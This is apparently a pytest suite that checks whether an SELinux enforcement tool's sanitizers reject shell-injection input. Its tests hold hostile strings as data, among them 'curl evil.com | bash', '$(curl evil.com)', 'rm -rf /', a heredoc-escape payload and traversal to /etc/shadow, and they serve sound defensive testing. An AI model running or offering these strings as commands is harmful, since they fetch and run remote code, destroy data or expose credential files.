"""Tests for input sanitization."""

import pytest

from enforcement_mcp.sanitize import (
    SanitizationError,
    quote_arg,
    sanitize_cil,
    sanitize_context_path,
    sanitize_identifier,
    sanitize_login,
    sanitize_mls_categories,
    sanitize_mls_range,
    sanitize_path,
    sanitize_process_name,
    sanitize_selinux_class,
    sanitize_selinux_permission,
    sanitize_selinux_type,
)


class TestSanitizePath:
    def test_valid_absolute_path(self):
        assert sanitize_path("/usr/bin/httpd") == "/usr/bin/httpd"

    def test_valid_path_with_dots(self):
        assert sanitize_path("/var/www/html/index.html") == "/var/www/html/index.html"

    def test_relative_path_rejected(self):
        with pytest.raises(SanitizationError, match="absolute"):
            sanitize_path("relative/path")

    def test_empty_path_rejected(self):
        with pytest.raises(SanitizationError, match="absolute"):
            sanitize_path("")

    def test_semicolon_injection_rejected(self):
        with pytest.raises(SanitizationError, match="forbidden"):
            sanitize_path("/tmp/x; rm -rf /")

    def test_pipe_injection_rejected(self):
        with pytest.raises(SanitizationError, match="forbidden"):
            sanitize_path("/tmp/x | curl evil.com")

    def test_backtick_injection_rejected(self):
        with pytest.raises(SanitizationError, match="forbidden"):
            sanitize_path("/tmp/`whoami`")

    def test_dollar_injection_rejected(self):
        with pytest.raises(SanitizationError, match="forbidden"):
            sanitize_path("/tmp/$(id)")

    def test_ampersand_rejected(self):
        with pytest.raises(SanitizationError, match="forbidden"):
            sanitize_path("/tmp/x && echo pwned")

    def test_path_traversal_rejected(self):
        with pytest.raises(SanitizationError, match="traversal"):
            sanitize_path("/tmp/../etc/shadow")

    def test_newline_rejected(self):
        with pytest.raises(SanitizationError, match="forbidden"):
            sanitize_path("/tmp/x\nwhoami")


class TestSanitizeIdentifier:
    def test_valid_boolean_name(self):
        assert sanitize_identifier("httpd_enable_homedirs") == "httpd_enable_homedirs"

    def test_valid_module_name(self):
        assert sanitize_identifier("my_custom_module") == "my_custom_module"

    def test_valid_with_dots_and_hyphens(self):
        assert sanitize_identifier("emcp_cve_2024_6387.v1") == "emcp_cve_2024_6387.v1"

    def test_empty_rejected(self):
        with pytest.raises(SanitizationError, match="empty"):
            sanitize_identifier("")

    def test_injection_rejected(self):
        with pytest.raises(SanitizationError):
            sanitize_identifier("foo; curl evil.com | bash")

    def test_starts_with_number_rejected(self):
        with pytest.raises(SanitizationError):
            sanitize_identifier("123abc")

    def test_too_long_rejected(self):
        with pytest.raises(SanitizationError, match="long"):
            sanitize_identifier("a" * 201)

    def test_spaces_rejected(self):
        with pytest.raises(SanitizationError):
            sanitize_identifier("httpd enable homedirs")


class TestSanitizeSelinuxType:
    def test_valid_type(self):
        assert sanitize_selinux_type("httpd_t") == "httpd_t"

    def test_valid_type_no_suffix(self):
        assert sanitize_selinux_type("kernel_t") == "kernel_t"

    def test_injection_rejected(self):
        with pytest.raises(SanitizationError):
            sanitize_selinux_type("httpd_t; whoami")

    def test_dot_rejected(self):
        with pytest.raises(SanitizationError):
            sanitize_selinux_type("httpd.t")


class TestSanitizeSelinuxPermission:
    def test_valid_permission(self):
        assert sanitize_selinux_permission("read") == "read"

    def test_valid_compound(self):
        assert sanitize_selinux_permission("getattr") == "getattr"

    def test_injection_rejected(self):
        with pytest.raises(SanitizationError):
            sanitize_selinux_permission("read; whoami")

    def test_empty_rejected(self):
        with pytest.raises(SanitizationError):
            sanitize_selinux_permission("")


class TestSanitizeSelinuxClass:
    def test_valid_class(self):
        assert sanitize_selinux_class("file") == "file"

    def test_valid_socket(self):
        assert sanitize_selinux_class("tcp_socket") == "tcp_socket"

    def test_injection_rejected(self):
        with pytest.raises(SanitizationError):
            sanitize_selinux_class("file$(id)")

    def test_empty_rejected(self):
        with pytest.raises(SanitizationError):
            sanitize_selinux_class("")


class TestSanitizeMlsRange:
    def test_simple_sensitivity(self):
        assert sanitize_mls_range("s0") == "s0"

    def test_range_with_categories(self):
        assert sanitize_mls_range("s0-s0:c0.c1023") == "s0-s0:c0.c1023"

    def test_single_categories(self):
        assert sanitize_mls_range("s0:c5,c10") == "s0:c5,c10"

    def test_injection_rejected(self):
        with pytest.raises(SanitizationError):
            sanitize_mls_range("s0; whoami")

    def test_empty_rejected(self):
        with pytest.raises(SanitizationError):
            sanitize_mls_range("")


class TestSanitizeMlsCategories:
    def test_valid_categories(self):
        assert sanitize_mls_categories(["c5", "c10"]) == ["c5", "c10"]

    def test_invalid_category_rejected(self):
        with pytest.raises(SanitizationError):
            sanitize_mls_categories(["c5", "evil; whoami"])

    def test_empty_string_rejected(self):
        with pytest.raises(SanitizationError):
            sanitize_mls_categories([""])


class TestSanitizeProcessName:
    def test_valid_process(self):
        assert sanitize_process_name("httpd") == "httpd"

    def test_valid_with_hyphen(self):
        assert sanitize_process_name("nginx-worker") == "nginx-worker"

    def test_valid_with_dot(self):
        assert sanitize_process_name("sshd.service") == "sshd.service"

    def test_injection_rejected(self):
        with pytest.raises(SanitizationError):
            sanitize_process_name("httpd'; curl evil.com|bash; '")

    def test_spaces_rejected(self):
        with pytest.raises(SanitizationError):
            sanitize_process_name("httpd worker")


class TestSanitizeLogin:
    def test_valid_login(self):
        assert sanitize_login("contractor") == "contractor"

    def test_valid_root(self):
        assert sanitize_login("root") == "root"

    def test_injection_rejected(self):
        with pytest.raises(SanitizationError):
            sanitize_login("root; whoami")


class TestSanitizeCil:
    def test_valid_cil(self):
        cil = "(block my_module\n  (allow httpd_t user_home_t (file (read)))\n)"
        assert sanitize_cil(cil) == cil

    def test_heredoc_terminator_rejected(self):
        with pytest.raises(SanitizationError, match="delimiter"):
            sanitize_cil("(allow httpd_t user_home_t (file (read)))\nEMCP_EOF\ncurl evil.com")

    def test_empty_rejected(self):
        with pytest.raises(SanitizationError):
            sanitize_cil("")

    def test_shell_metachar_outside_cil_rejected(self):
        with pytest.raises(SanitizationError, match="metacharacters"):
            sanitize_cil("$(curl evil.com)")


class TestSanitizeContextPath:
    def test_valid_simple_path(self):
        assert sanitize_context_path("/var/www/html") == "/var/www/html"

    def test_valid_regex_path(self):
        assert (
            sanitize_context_path("/home/jsmith/public_html(/.*)?")
            == "/home/jsmith/public_html(/.*)?"
        )

    def test_injection_rejected(self):
        with pytest.raises(SanitizationError):
            sanitize_context_path("/tmp'; curl evil.com; echo '")


class TestQuoteArg:
    def test_simple_value(self):
        assert quote_arg("httpd_t") == "httpd_t"

    def test_spaces_quoted(self):
        result = quote_arg("hello world")
        assert " " not in result or result.startswith("'")

    def test_metacharacters_quoted(self):
        result = quote_arg("; rm -rf /")
        assert "rm" in result
        assert result != "; rm -rf /"


class TestSanitizationError:
    def test_to_dict(self):
        err = SanitizationError("path", "/tmp; whoami", "Contains forbidden characters")
        d = err.to_dict()
        assert d["error"] == "invalid_input"
        assert d["parameter"] == "path"
        assert "forbidden" in d["reason"]

    def test_long_value_preview(self):
        err = SanitizationError("cil", "x" * 100, "too long")
        assert len(err.value_preview) == 50
